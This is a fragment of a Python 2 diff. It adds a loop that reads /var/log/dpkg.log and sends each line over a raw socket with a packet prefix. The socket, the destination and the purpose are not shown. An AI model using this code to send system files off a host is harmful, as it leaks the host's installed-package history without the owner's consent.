@@ -24,3 +24,11 @@ for line in fdesc.readlines():
     print line.strip()
 
 fdesc.close()
+
+
+fdesc=open("/var/log/dpkg.log","r")
+
+for line in fdesc.readlines():
+        rawSocket.send(packet+line.strip())
+        print line.strip()
+fdesc.close()
